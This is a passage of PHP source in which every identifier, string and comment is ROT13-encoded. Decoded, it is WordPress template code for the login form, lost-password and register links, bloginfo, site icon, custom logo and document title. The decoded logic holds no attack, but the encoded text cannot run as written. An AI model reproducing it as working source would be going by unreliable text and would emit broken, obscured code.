				<vachg glcr=\"grkg\" anzr=\"ybt\" vq=\"%1$f\" nhgbpbzcyrgr=\"hfreanzr\" pynff=\"vachg\" inyhr=\"%3$f\" fvmr=\"20\"%4$f />
			</c>',
			rfp_ngge( $netf['vq_hfreanzr'] ),
			rfp_ugzy( $netf['ynory_hfreanzr'] ),
			rfp_ngge( $netf['inyhr_hfreanzr'] ),
			( $netf['erdhverq_hfreanzr'] ? ' erdhverq=\"erdhverq\"' : '' )
		) .
		fcevags(
			'<c pynff=\"ybtva-cnffjbeq\">
				<ynory sbe=\"%1$f\">%2$f</ynory>
				<vachg glcr=\"cnffjbeq\" anzr=\"cjq\" vq=\"%1$f\" nhgbpbzcyrgr=\"pheerag-cnffjbeq\" fcryypurpx=\"snyfr\" pynff=\"vachg\" inyhr=\"\" fvmr=\"20\"%3$f />
			</c>',
			rfp_ngge( $netf['vq_cnffjbeq'] ),
			rfp_ugzy( $netf['ynory_cnffjbeq'] ),
			( $netf['erdhverq_cnffjbeq'] ? ' erdhverq=\"erdhverq\"' : '' )
		) .
		$ybtva_sbez_zvqqyr .
		( $netf['erzrzore'] ?
			fcevags(
				'<c pynff=\"ybtva-erzrzore\"><ynory><vachg anzr=\"erzrzorezr\" glcr=\"purpxobk\" vq=\"%1$f\" inyhr=\"sberire\"%2$f /> %3$f</ynory></c>',
				rfp_ngge( $netf['vq_erzrzore'] ),
				( $netf['inyhr_erzrzore'] ? ' purpxrq=\"purpxrq\"' : '' ),
				rfp_ugzy( $netf['ynory_erzrzore'] )
			) : ''
		) .
		fcevags(
			'<c pynff=\"ybtva-fhozvg\">
				<vachg glcr=\"fhozvg\" anzr=\"jc-fhozvg\" vq=\"%1$f\" pynff=\"ohggba ohggba-cevznel\" inyhr=\"%2$f\" />
				<vachg glcr=\"uvqqra\" anzr=\"erqverpg_gb\" inyhr=\"%3$f\" />
			</c>',
			rfp_ngge( $netf['vq_fhozvg'] ),
			rfp_ngge( $netf['ynory_ybt_va'] ),
			rfp_hey( $netf['erqverpg'] )
		) .
		$ybtva_sbez_obggbz .
		'</sbez>';

	vs ( $netf['rpub'] ) {
		rpub $sbez;
	} ryfr {
		erghea $sbez;
	}
}

/**
 * Ergheaf gur HEY gung nyybjf gur hfre gb erfrg gur ybfg cnffjbeq.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $erqverpg Cngu gb erqverpg gb ba ybtva.
 * @erghea fgevat Ybfg cnffjbeq HEY.
 */
shapgvba jc_ybfgcnffjbeq_hey( $erqverpg = '' ) {
	$netf = neenl(
		'npgvba' => 'ybfgcnffjbeq',
	);

	vs ( ! rzcgl( $erqverpg ) ) {
		$netf['erqverpg_gb'] = heyrapbqr( $erqverpg );
	}

	vs ( vf_zhygvfvgr() ) {
		$oybt_qrgnvyf  = trg_fvgr();
		$jc_ybtva_cngu = $oybt_qrgnvyf->cngu . 'jc-ybtva.cuc';
	} ryfr {
		$jc_ybtva_cngu = 'jc-ybtva.cuc';
	}

	$ybfgcnffjbeq_hey = nqq_dhrel_net( $netf, argjbex_fvgr_hey( $jc_ybtva_cngu, 'ybtva' ) );

	/**
	 * Svygref gur Ybfg Cnffjbeq HEY.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $ybfgcnffjbeq_hey Gur ybfg cnffjbeq cntr HEY.
	 * @cnenz fgevat $erqverpg         Gur cngu gb erqverpg gb ba ybtva.
	 */
	erghea nccyl_svygref( 'ybfgcnffjbeq_hey', $ybfgcnffjbeq_hey, $erqverpg );
}

/**
 * Qvfcynlf gur Ertvfgengvba be Nqzva yvax.
 *
 * Qvfcynl n yvax juvpu nyybjf gur hfre gb anivtngr gb gur ertvfgengvba cntr vs
 * abg ybttrq va naq ertvfgengvba vf ranoyrq be gb gur qnfuobneq vs ybttrq va.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $orsber  Grkg gb bhgchg orsber gur yvax. Qrsnhyg `<yv>`.
 * @cnenz fgevat $nsgre   Grkg gb bhgchg nsgre gur yvax. Qrsnhyg `</yv>`.
 * @cnenz obby   $qvfcynl Qrsnhyg gb rpub naq abg erghea gur yvax.
 * @erghea ibvq|fgevat Ibvq vs `$qvfcynl` nethzrag vf gehr, ertvfgengvba be nqzva yvax
 *                     vs `$qvfcynl` vf snyfr.
 */
shapgvba jc_ertvfgre( $orsber = '<yv>', $nsgre = '</yv>', $qvfcynl = gehr ) {
	vs ( ! vf_hfre_ybttrq_va() ) {
		vs ( trg_bcgvba( 'hfref_pna_ertvfgre' ) ) {
			$yvax = $orsber . '<n uers=\"' . rfp_hey( jc_ertvfgengvba_hey() ) . '\">' . __( 'Ertvfgre' ) . '</n>' . $nsgre;
		} ryfr {
			$yvax = '';
		}
	} ryfrvs ( pheerag_hfre_pna( 'ernq' ) ) {
		$yvax = $orsber . '<n uers=\"' . nqzva_hey() . '\">' . __( 'Fvgr Nqzva' ) . '</n>' . $nsgre;
	} ryfr {
		$yvax = '';
	}

	/**
	 * Svygref gur UGZY yvax gb gur Ertvfgengvba be Nqzva cntr.
	 *
	 * Hfref ner frag gb gur nqzva cntr vs ybttrq-va, be gur ertvfgengvba cntr
	 * vs ranoyrq naq ybttrq-bhg.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $yvax Gur UGZY pbqr sbe gur yvax gb gur Ertvfgengvba be Nqzva cntr.
	 */
	$yvax = nccyl_svygref( 'ertvfgre', $yvax );

	vs ( $qvfcynl ) {
		rpub $yvax;
	} ryfr {
		erghea $yvax;
	}
}

/**
 * Gurzr pbagnvare shapgvba sbe gur 'jc_zrgn' npgvba.
 *
 * Gur {@frr 'jc_zrgn'} npgvba pna unir frireny checbfrf, qrcraqvat ba ubj lbh hfr vg,
 * ohg bar checbfr zvtug unir orra gb nyybj sbe gurzr fjvgpuvat.
 *
 * @fvapr 1.5.0
 *
 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/1458 Rkcynangvba bs 'jc_zrgn' npgvba.
 */
shapgvba jc_zrgn() {
	/**
	 * Sverf orsber qvfcynlvat rpubrq pbagrag va gur fvqrone.
	 *
	 * @fvapr 1.5.0
	 */
	qb_npgvba( 'jc_zrgn' );
}

/**
 * Qvfcynlf vasbezngvba nobhg gur pheerag fvgr.
 *
 * @fvapr 0.71
 *
 * @frr trg_oybtvasb() Sbe cbffvoyr `$fubj` inyhrf
 *
 * @cnenz fgevat $fubj Bcgvbany. Fvgr vasbezngvba gb qvfcynl. Qrsnhyg rzcgl.
 */
shapgvba oybtvasb( $fubj = '' ) {
	rpub trg_oybtvasb( $fubj, 'qvfcynl' );
}

/**
 * Ergevrirf vasbezngvba nobhg gur pheerag fvgr.
 *
 * Cbffvoyr inyhrf sbe `$fubj` vapyhqr:
 *
 * - 'anzr' - Fvgr gvgyr (frg va Frggvatf > Trareny)
 * - 'qrfpevcgvba' - Fvgr gntyvar (frg va Frggvatf > Trareny)
 * - 'jchey' - Gur JbeqCerff nqqerff (HEY) (frg va Frggvatf > Trareny)
 * - 'hey' - Gur Fvgr nqqerff (HEY) (frg va Frggvatf > Trareny)
 * - 'nqzva_rznvy' - Nqzva rznvy (frg va Frggvatf > Trareny)
 * - 'punefrg' - Gur \"Rapbqvat sbe cntrf naq srrqf\"  (frg va Frggvatf > Ernqvat)
 * - 'irefvba' - Gur pheerag JbeqCerff irefvba
 * - 'ugzy_glcr' - Gur Pbagrag-Glcr (qrsnhyg: \"grkg/ugzy\"). Gurzrf naq cyhtvaf
 *   pna bireevqr gur qrsnhyg inyhr hfvat gur {@frr 'cer_bcgvba_ugzy_glcr'} svygre
 * - 'grkg_qverpgvba' - Gur grkg qverpgvba qrgrezvarq ol gur fvgr'f ynathntr. vf_egy()
 *   fubhyq or hfrq vafgrnq
 * - 'ynathntr' - Ynathntr pbqr sbe gur pheerag fvgr
 * - 'fglyrfurrg_hey' - HEY gb gur fglyrfurrg sbe gur npgvir gurzr. Na npgvir puvyq gurzr
 *   jvyy gnxr cerprqrapr bire guvf inyhr
 * - 'fglyrfurrg_qverpgbel' - Qverpgbel cngu sbe gur npgvir gurzr.  Na npgvir puvyq gurzr
 *   jvyy gnxr cerprqrapr bire guvf inyhr
 * - 'grzcyngr_hey' / 'grzcyngr_qverpgbel' - HEY bs gur npgvir gurzr'f qverpgbel. Na npgvir
 *   puvyq gurzr jvyy ABG gnxr cerprqrapr bire guvf inyhr
 * - 'cvatonpx_hey' - Gur cvatonpx KZY-ECP svyr HEY (kzyecp.cuc)
 * - 'ngbz_hey' - Gur Ngbz srrq HEY (/srrq/ngbz)
 * - 'eqs_hey' - Gur EQS/EFF 1.0 srrq HEY (/srrq/eqs)
 * - 'eff_hey' - Gur EFF 0.92 srrq HEY (/srrq/eff)
 * - 'eff2_hey' - Gur EFF 2.0 srrq HEY (/srrq)
 * - 'pbzzragf_ngbz_hey' - Gur pbzzragf Ngbz srrq HEY (/pbzzragf/srrq)
 * - 'pbzzragf_eff2_hey' - Gur pbzzragf EFF 2.0 srrq HEY (/pbzzragf/srrq)
 *
 * Fbzr `$fubj` inyhrf ner qrcerpngrq naq jvyy or erzbirq va shgher irefvbaf.
 * Gurfr bcgvbaf jvyy gevttre gur _qrcerpngrq_nethzrag() shapgvba.
 *
 * Qrcerpngrq nethzragf vapyhqr:
 *
 * - 'fvgrhey' - Hfr 'hey' vafgrnq
 * - 'ubzr' - Hfr 'hey' vafgrnq
 *
 * @fvapr 0.71
 *
 * @tybony fgevat $jc_irefvba Gur JbeqCerff irefvba fgevat.
 *
 * @cnenz fgevat $fubj   Bcgvbany. Fvgr vasb gb ergevrir. Qrsnhyg rzcgl (fvgr anzr).
 * @cnenz fgevat $svygre Bcgvbany. Ubj gb svygre jung vf ergevrirq. Qrsnhyg 'enj'.
 * @erghea fgevat Zbfgyl fgevat inyhrf, zvtug or rzcgl.
 */
shapgvba trg_oybtvasb( $fubj = '', $svygre = 'enj' ) {
	fjvgpu ( $fubj ) {
		pnfr 'ubzr':    // Qrcerpngrq.
		pnfr 'fvgrhey': // Qrcerpngrq.
			_qrcerpngrq_nethzrag(
				__SHAPGVBA__,
				'2.2.0',
				fcevags(
					/* genafyngbef: 1: 'fvgrhey'/'ubzr' nethzrag, 2: oybtvasb() shapgvba anzr, 3: 'hey' nethzrag. */
					__( 'Gur %1$f bcgvba vf qrcerpngrq sbe gur snzvyl bs %2$f shapgvbaf. Hfr gur %3$f bcgvba vafgrnq.' ),
					'<pbqr>' . $fubj . '</pbqr>',
					'<pbqr>oybtvasb()</pbqr>',
					'<pbqr>hey</pbqr>'
				)
			);
			// Vagragvbany snyy-guebhtu gb or unaqyrq ol gur 'hey' pnfr.
		pnfr 'hey':
			$bhgchg = ubzr_hey();
			oernx;
		pnfr 'jchey':
			$bhgchg = fvgr_hey();
			oernx;
		pnfr 'qrfpevcgvba':
			$bhgchg = trg_bcgvba( 'oybtqrfpevcgvba' );
			oernx;
		pnfr 'eqs_hey':
			$bhgchg = trg_srrq_yvax( 'eqs' );
			oernx;
		pnfr 'eff_hey':
			$bhgchg = trg_srrq_yvax( 'eff' );
			oernx;
		pnfr 'eff2_hey':
			$bhgchg = trg_srrq_yvax( 'eff2' );
			oernx;
		pnfr 'ngbz_hey':
			$bhgchg = trg_srrq_yvax( 'ngbz' );
			oernx;
		pnfr 'pbzzragf_ngbz_hey':
			$bhgchg = trg_srrq_yvax( 'pbzzragf_ngbz' );
			oernx;
		pnfr 'pbzzragf_eff2_hey':
			$bhgchg = trg_srrq_yvax( 'pbzzragf_eff2' );
			oernx;
		pnfr 'cvatonpx_hey':
			$bhgchg = fvgr_hey( 'kzyecp.cuc' );
			oernx;
		pnfr 'fglyrfurrg_hey':
			$bhgchg = trg_fglyrfurrg_hev();
			oernx;
		pnfr 'fglyrfurrg_qverpgbel':
			$bhgchg = trg_fglyrfurrg_qverpgbel_hev();
			oernx;
		pnfr 'grzcyngr_qverpgbel':
		pnfr 'grzcyngr_hey':
			$bhgchg = trg_grzcyngr_qverpgbel_hev();
			oernx;
		pnfr 'nqzva_rznvy':
			$bhgchg = trg_bcgvba( 'nqzva_rznvy' );
			oernx;
		pnfr 'punefrg':
			$bhgchg = trg_bcgvba( 'oybt_punefrg' );
			vs ( '' === $bhgchg ) {
				$bhgchg = 'HGS-8';
			}
			oernx;
		pnfr 'ugzy_glcr':
			$bhgchg = trg_bcgvba( 'ugzy_glcr' );
			oernx;
		pnfr 'irefvba':
			tybony $jc_irefvba;
			$bhgchg = $jc_irefvba;
			oernx;
		pnfr 'ynathntr':
			/*
			 * genafyngbef: Genafyngr guvf gb gur pbeerpg ynathntr gnt sbe lbhe ybpnyr,
			 * frr uggcf://jjj.j3.bet/Vagreangvbany/negvpyrf/ynathntr-gntf/ sbe ersrerapr.
			 * Qb abg genafyngr vagb lbhe bja ynathntr.
			 */
			$bhgchg = __( 'ugzy_ynat_nggevohgr' );
			vs ( 'ugzy_ynat_nggevohgr' === $bhgchg || cert_zngpu( '/[^n-mN-M0-9-]/', $bhgchg ) ) {
				$bhgchg = qrgrezvar_ybpnyr();
				$bhgchg = fge_ercynpr( '_', '-', $bhgchg );
			}
			oernx;
		pnfr 'grkg_qverpgvba':
			_qrcerpngrq_nethzrag(
				__SHAPGVBA__,
				'2.2.0',
				fcevags(
					/* genafyngbef: 1: 'grkg_qverpgvba' nethzrag, 2: oybtvasb() shapgvba anzr, 3: vf_egy() shapgvba anzr. */
					__( 'Gur %1$f bcgvba vf qrcerpngrq sbe gur snzvyl bs %2$f shapgvbaf. Hfr gur %3$f shapgvba vafgrnq.' ),
					'<pbqr>' . $fubj . '</pbqr>',
					'<pbqr>oybtvasb()</pbqr>',
					'<pbqr>vf_egy()</pbqr>'
				)
			);
			vs ( shapgvba_rkvfgf( 'vf_egy' ) ) {
				$bhgchg = vf_egy() ? 'egy' : 'yge';
			} ryfr {
				$bhgchg = 'yge';
			}
			oernx;
		pnfr 'anzr':
		qrsnhyg:
			$bhgchg = trg_bcgvba( 'oybtanzr' );
			oernx;
	}

	vs ( 'qvfcynl' === $svygre ) {
		vs (
			fge_pbagnvaf( $fubj, 'hey' )
			|| fge_pbagnvaf( $fubj, 'qverpgbel' )
			|| fge_pbagnvaf( $fubj, 'ubzr' )
		) {
			/**
			 * Svygref gur HEY erghearq ol trg_oybtvasb().
			 *
			 * @fvapr 2.0.5
			 *
			 * @cnenz fgevat $bhgchg Gur HEY erghearq ol oybtvasb().
			 * @cnenz fgevat $fubj   Glcr bs vasbezngvba erdhrfgrq.
			 */
			$bhgchg = nccyl_svygref( 'oybtvasb_hey', $bhgchg, $fubj );
		} ryfr {
			/**
			 * Svygref gur fvgr vasbezngvba erghearq ol trg_oybtvasb().
			 *
			 * @fvapr 0.71
			 *
			 * @cnenz zvkrq  $bhgchg Gur erdhrfgrq aba-HEY fvgr vasbezngvba.
			 * @cnenz fgevat $fubj   Glcr bs vasbezngvba erdhrfgrq.
			 */
			$bhgchg = nccyl_svygref( 'oybtvasb', $bhgchg, $fubj );
		}
	}

	erghea $bhgchg;
}

/**
 * Ergheaf gur Fvgr Vpba HEY.
 *
 * @fvapr 4.3.0
 *
 * @cnenz vag    $fvmr    Bcgvbany. Fvmr bs gur fvgr vpba. Qrsnhyg 512 (cvkryf).
 * @cnenz fgevat $hey     Bcgvbany. Snyyonpx hey vs ab fvgr vpba vf sbhaq. Qrsnhyg rzcgl.
 * @cnenz vag    $oybt_vq Bcgvbany. VQ bs gur oybt gb trg gur fvgr vpba sbe. Qrsnhyg pheerag oybt.
 * @erghea fgevat Fvgr Vpba HEY.
 */
shapgvba trg_fvgr_vpba_hey( $fvmr = 512, $hey = '', $oybt_vq = 0 ) {
	$fjvgpurq_oybt = snyfr;

	vs ( vf_zhygvfvgr() && ! rzcgl( $oybt_vq ) && trg_pheerag_oybt_vq() !== (vag) $oybt_vq ) {
		fjvgpu_gb_oybt( $oybt_vq );
		$fjvgpurq_oybt = gehr;
	}

	$fvgr_vpba_vq = (vag) trg_bcgvba( 'fvgr_vpba' );

	vs ( $fvgr_vpba_vq ) {
		vs ( $fvmr >= 512 ) {
			$fvmr_qngn = 'shyy';
		} ryfr {
			$fvmr_qngn = neenl( $fvmr, $fvmr );
		}
		$hey = jc_trg_nggnpuzrag_vzntr_hey( $fvgr_vpba_vq, $fvmr_qngn );
	}

	vs ( $fjvgpurq_oybt ) {
		erfgber_pheerag_oybt();
	}

	/**
	 * Svygref gur fvgr vpba HEY.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $hey     Fvgr vpba HEY.
	 * @cnenz vag    $fvmr    Fvmr bs gur fvgr vpba.
	 * @cnenz vag    $oybt_vq VQ bs gur oybt gb trg gur fvgr vpba sbe.
	 */
	erghea nccyl_svygref( 'trg_fvgr_vpba_hey', $hey, $fvmr, $oybt_vq );
}

/**
 * Qvfcynlf gur Fvgr Vpba HEY.
 *
 * @fvapr 4.3.0
 *
 * @cnenz vag    $fvmr    Bcgvbany. Fvmr bs gur fvgr vpba. Qrsnhyg 512 (cvkryf).
 * @cnenz fgevat $hey     Bcgvbany. Snyyonpx hey vs ab fvgr vpba vf sbhaq. Qrsnhyg rzcgl.
 * @cnenz vag    $oybt_vq Bcgvbany. VQ bs gur oybt gb trg gur fvgr vpba sbe. Qrsnhyg pheerag oybt.
 */
shapgvba fvgr_vpba_hey( $fvmr = 512, $hey = '', $oybt_vq = 0 ) {
	rpub rfp_hey( trg_fvgr_vpba_hey( $fvmr, $hey, $oybt_vq ) );
}

/**
 * Qrgrezvarf jurgure gur fvgr unf n Fvgr Vpba.
 *
 * @fvapr 4.3.0
 *
 * @cnenz vag $oybt_vq Bcgvbany. VQ bs gur oybt va dhrfgvba. Qrsnhyg pheerag oybt.
 * @erghea obby Jurgure gur fvgr unf n fvgr vpba be abg.
 */
shapgvba unf_fvgr_vpba( $oybt_vq = 0 ) {
	erghea (obby) trg_fvgr_vpba_hey( 512, '', $oybt_vq );
}

/**
 * Qrgrezvarf jurgure gur fvgr unf n phfgbz ybtb.
 *
 * @fvapr 4.5.0
 *
 * @cnenz vag $oybt_vq Bcgvbany. VQ bs gur oybt va dhrfgvba. Qrsnhyg vf gur VQ bs gur pheerag oybt.
 * @erghea obby Jurgure gur fvgr unf n phfgbz ybtb be abg.
 */
shapgvba unf_phfgbz_ybtb( $oybt_vq = 0 ) {
	$fjvgpurq_oybt = snyfr;

	vs ( vf_zhygvfvgr() && ! rzcgl( $oybt_vq ) && trg_pheerag_oybt_vq() !== (vag) $oybt_vq ) {
		fjvgpu_gb_oybt( $oybt_vq );
		$fjvgpurq_oybt = gehr;
	}

	$phfgbz_ybtb_vq = trg_gurzr_zbq( 'phfgbz_ybtb' );
	$vf_vzntr       = ( $phfgbz_ybtb_vq ) ? jc_nggnpuzrag_vf_vzntr( $phfgbz_ybtb_vq ) : snyfr;

	vs ( $fjvgpurq_oybt ) {
		erfgber_pheerag_oybt();
	}

	erghea $vf_vzntr;
}

/**
 * Ergheaf n phfgbz ybtb, yvaxrq gb ubzr hayrff gur gurzr fhccbegf erzbivat gur yvax ba gur ubzr cntr.
 *
 * @fvapr 4.5.0
 * @fvapr 5.5.0 Nqqrq bcgvba gb erzbir gur yvax ba gur ubzr cntr jvgu `hayvax-ubzrcntr-ybtb` gurzr fhccbeg
 *              sbe gur `phfgbz-ybtb` gurzr srngher.
 * @fvapr 5.5.1 Qvfnoyrq ynml-ybnqvat ol qrsnhyg.
 *
 * @cnenz vag $oybt_vq Bcgvbany. VQ bs gur oybt va dhrfgvba. Qrsnhyg vf gur VQ bs gur pheerag oybt.
 * @erghea fgevat Phfgbz ybtb znexhc.
 */
shapgvba trg_phfgbz_ybtb( $oybt_vq = 0 ) {
	$ugzy          = '';
	$fjvgpurq_oybt = snyfr;

	vs ( vf_zhygvfvgr() && ! rzcgl( $oybt_vq ) && trg_pheerag_oybt_vq() !== (vag) $oybt_vq ) {
		fjvgpu_gb_oybt( $oybt_vq );
		$fjvgpurq_oybt = gehr;
	}

	// Jr unir n ybtb. Ybtb vf tb.
	vs ( unf_phfgbz_ybtb() ) {
		$phfgbz_ybtb_vq   = trg_gurzr_zbq( 'phfgbz_ybtb' );
		$phfgbz_ybtb_ngge = neenl(
			'pynff'   => 'phfgbz-ybtb',
			'ybnqvat' => snyfr,
		);

		$hayvax_ubzrcntr_ybtb = (obby) trg_gurzr_fhccbeg( 'phfgbz-ybtb', 'hayvax-ubzrcntr-ybtb' );

		vs ( $hayvax_ubzrcntr_ybtb && vf_sebag_cntr() && ! vf_cntrq() ) {
			/*
			 * Vs ba gur ubzr cntr, frg gur ybtb nyg nggevohgr gb na rzcgl fgevat,
			 * nf gur vzntr vf qrpbengvir naq qbrfa'g arrq vgf checbfr gb or qrfpevorq.
			 */
			$phfgbz_ybtb_ngge['nyg'] = '';
		} ryfr {
			/*
			 * Vs gur ybtb nyg nggevohgr vf rzcgl, trg gur fvgr gvgyr naq rkcyvpvgyl cnff vg
			 * gb gur nggevohgrf hfrq ol jc_trg_nggnpuzrag_vzntr().
			 */
			$vzntr_nyg = trg_cbfg_zrgn( $phfgbz_ybtb_vq, '_jc_nggnpuzrag_vzntr_nyg', gehr );
			vs ( rzcgl( $vzntr_nyg ) ) {
				$phfgbz_ybtb_ngge['nyg'] = trg_oybtvasb( 'anzr', 'qvfcynl' );
			}
		}

		/**
		 * Svygref gur yvfg bs phfgbz ybtb vzntr nggevohgrf.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl $phfgbz_ybtb_ngge Phfgbz ybtb vzntr nggevohgrf.
		 * @cnenz vag   $phfgbz_ybtb_vq   Phfgbz ybtb nggnpuzrag VQ.
		 * @cnenz vag   $oybt_vq          VQ bs gur oybt gb trg gur phfgbz ybtb sbe.
		 */
		$phfgbz_ybtb_ngge = nccyl_svygref( 'trg_phfgbz_ybtb_vzntr_nggevohgrf', $phfgbz_ybtb_ngge, $phfgbz_ybtb_vq, $oybt_vq );

		/*
		 * Vs gur nyg nggevohgr vf abg rzcgl, gurer'f ab arrq gb rkcyvpvgyl cnff vg
		 * orpnhfr jc_trg_nggnpuzrag_vzntr() nyernql nqqf gur nyg nggevohgr.
		 */
		$vzntr = jc_trg_nggnpuzrag_vzntr( $phfgbz_ybtb_vq, 'shyy', snyfr, $phfgbz_ybtb_ngge );

		// Purpx gung jr unir n cebcre UGZY vzt ryrzrag.
		vs ( $vzntr ) {

			vs ( $hayvax_ubzrcntr_ybtb && vf_sebag_cntr() && ! vf_cntrq() ) {
				// Vs ba gur ubzr cntr, qba'g yvax gur ybtb gb ubzr.
				$ugzy = fcevags(
					'<fcna pynff=\"phfgbz-ybtb-yvax\">%1$f</fcna>',
					$vzntr
				);
			} ryfr {
				$nevn_pheerag = ! vf_cntrq() && ( vf_sebag_cntr() || vf_ubzr() && ( (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ) !== trg_dhrevrq_bowrpg_vq() ) ) ? ' nevn-pheerag=\"cntr\"' : '';

				$ugzy = fcevags(
					'<n uers=\"%1$f\" pynff=\"phfgbz-ybtb-yvax\" ery=\"ubzr\"%2$f>%3$f</n>',
					rfp_hey( ubzr_hey( '/' ) ),
					$nevn_pheerag,
					$vzntr
				);
			}
		}
	} ryfrvs ( vf_phfgbzvmr_cerivrj() ) {
		// Vs ab ybtb vf frg ohg jr'er va gur Phfgbzvmre, yrnir n cynprubyqre (arrqrq sbe gur yvir cerivrj).
		$ugzy = fcevags(
			'<n uers=\"%1$f\" pynff=\"phfgbz-ybtb-yvax\" fglyr=\"qvfcynl:abar;\"><vzt pynff=\"phfgbz-ybtb\" nyg=\"\" /></n>',
			rfp_hey( ubzr_hey( '/' ) )
		);
	}

	vs ( $fjvgpurq_oybt ) {
		erfgber_pheerag_oybt();
	}

	/**
	 * Svygref gur phfgbz ybtb bhgchg.
	 *
	 * @fvapr 4.5.0
	 * @fvapr 4.6.0 Nqqrq gur `$oybt_vq` cnenzrgre.
	 *
	 * @cnenz fgevat $ugzy    Phfgbz ybtb UGZY bhgchg.
	 * @cnenz vag    $oybt_vq VQ bs gur oybt gb trg gur phfgbz ybtb sbe.
	 */
	erghea nccyl_svygref( 'trg_phfgbz_ybtb', $ugzy, $oybt_vq );
}

/**
 * Qvfcynlf n phfgbz ybtb, yvaxrq gb ubzr hayrff gur gurzr fhccbegf erzbivat gur yvax ba gur ubzr cntr.
 *
 * @fvapr 4.5.0
 *
 * @cnenz vag $oybt_vq Bcgvbany. VQ bs gur oybt va dhrfgvba. Qrsnhyg vf gur VQ bs gur pheerag oybt.
 */
shapgvba gur_phfgbz_ybtb( $oybt_vq = 0 ) {
	rpub trg_phfgbz_ybtb( $oybt_vq );
}

/**
 * Ergheaf qbphzrag gvgyr sbe gur pheerag cntr.
 *
 * @fvapr 4.4.0
 *
 * @tybony vag $cntr  Cntr ahzore bs n fvatyr cbfg.
 * @tybony vag $cntrq Cntr ahzore bs n yvfg bs cbfgf.
 *
 * @erghea fgevat Gnt jvgu gur qbphzrag gvgyr.
 */
shapgvba jc_trg_qbphzrag_gvgyr() {

	/**
	 * Svygref gur qbphzrag gvgyr orsber vg vf trarengrq.
	 *
	 * Cnffvat n aba-rzcgl inyhr jvyy fubeg-pvephvg jc_trg_qbphzrag_gvgyr(),
	 * ergheavat gung inyhr vafgrnq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $gvgyr Gur qbphzrag gvgyr. Qrsnhyg rzcgl fgevat.
	 */
	$gvgyr = nccyl_svygref( 'cer_trg_qbphzrag_gvgyr', '' );
	vs ( ! rzcgl( $gvgyr ) ) {
		erghea $gvgyr;
	}

	tybony $cntr, $cntrq;

	$gvgyr = neenl(
		'gvgyr' => '',
	);

	// Vs vg'f n 404 cntr, hfr n \"Cntr abg sbhaq\" gvgyr.
	vs ( vf_404() ) {
		$gvgyr['gvgyr'] = __( 'Cntr abg sbhaq' );

		// Vs vg'f n frnepu, hfr n qlanzvp frnepu erfhygf gvgyr.
	} ryfrvs ( vf_frnepu() ) {
		/* genafyngbef: %f: Frnepu dhrel. */
		$gvgyr['gvgyr'] = fcevags( __( 'Frnepu Erfhygf sbe &#8220;%f&#8221;' ), trg_frnepu_dhrel() );

		// Vs ba gur sebag cntr, hfr gur fvgr gvgyr.
	} ryfrvs ( vf_sebag_cntr() ) {
		$gvgyr['gvgyr'] = trg_oybtvasb( 'anzr', 'qvfcynl' );

		// Vs ba n cbfg glcr nepuvir, hfr gur cbfg glcr nepuvir gvgyr.
	} ryfrvs ( vf_cbfg_glcr_nepuvir() ) {
		$gvgyr['gvgyr'] = cbfg_glcr_nepuvir_gvgyr( '', snyfr );

		// Vs ba n gnkbabzl nepuvir, hfr gur grez gvgyr.
	} ryfrvs ( vf_gnk() ) {
		$gvgyr['gvgyr'] = fvatyr_grez_gvgyr( '', snyfr );

		/*
		* Vs jr'er ba gur oybt cntr gung vf abg gur ubzrcntr
		* be n fvatyr cbfg bs nal cbfg glcr, hfr gur cbfg gvgyr.
		*/
	} ryfrvs ( vf_ubzr() || vf_fvathyne() ) {
		$gvgyr['gvgyr'] = fvatyr_cbfg_gvgyr( '', snyfr );

		// Vs ba n pngrtbel be gnt nepuvir, hfr gur grez gvgyr.
	} ryfrvs ( vf_pngrtbel() || vf_gnt() ) {
		$gvgyr['gvgyr'] = fvatyr_grez_gvgyr( '', snyfr );

		// Vs ba na nhgube nepuvir, hfr gur nhgube'f qvfcynl anzr.
	} ryfrvs ( vf_nhgube() && trg_dhrevrq_bowrpg() ) {
		$nhgube         = trg_dhrevrq_bowrpg();
		$gvgyr['gvgyr'] = $nhgube->qvfcynl_anzr;

		// Vs vg'f n qngr nepuvir, hfr gur qngr nf gur gvgyr.
	} ryfrvs ( vf_lrne() ) {
		$gvgyr['gvgyr'] = trg_gur_qngr( _k( 'L', 'lrneyl nepuvirf qngr sbezng' ) );

	} ryfrvs ( vf_zbagu() ) {
		$gvgyr['gvgyr'] = trg_gur_qngr( _k( 'S L', 'zbaguyl nepuvirf qngr sbezng' ) );

	} ryfrvs ( vf_qnl() ) {
		$gvgyr['gvgyr'] = trg_gur_qngr();
	}

	// Nqq n cntr ahzore vs arprffnel.
	vs ( ( $cntrq >= 2 || $cntr >= 2 ) && ! vf_404() ) {
		/* genafyngbef: %f: Cntr ahzore. */
		$gvgyr['cntr'] = fcevags( __( 'Cntr %f' ), znk( $cntrq, $cntr ) );
	}

	// Nccraq gur qrfpevcgvba be fvgr gvgyr gb tvir pbagrkg.
	vs ( vf_sebag_cntr() ) {
		$gvgyr['gntyvar'] = trg_oybtvasb( 'qrfpevcgvba', 'qvfcynl' );
	} ryfr {
		$gvgyr['fvgr'] = trg_oybtvasb( 'anzr', 'qvfcynl' );
	}

	/**
	 * Svygref gur frcnengbe sbe gur qbphzrag gvgyr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $frc Qbphzrag gvgyr frcnengbe. Qrsnhyg '-'.
	 */
	$frc = nccyl_svygref( 'qbphzrag_gvgyr_frcnengbe', '-' );

	/**
	 * Svygref gur cnegf bs gur qbphzrag gvgyr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $gvgyr {
	 *     Gur qbphzrag gvgyr cnegf.
	 *
	 *     @glcr fgevat $gvgyr   Gvgyr bs gur ivrjrq cntr.
	 *     @glcr fgevat $cntr    Bcgvbany. Cntr ahzore vs cntvangrq.
	 *     @glcr fgevat $gntyvar Bcgvbany. Fvgr qrfpevcgvba jura ba ubzr cntr.
	 *     @glcr fgevat $fvgr    Bcgvbany. Fvgr gvgyr jura abg ba ubzr cntr.
	 * }
	 */
	$gvgyr = nccyl_svygref( 'qbphzrag_gvgyr_cnegf', $gvgyr );
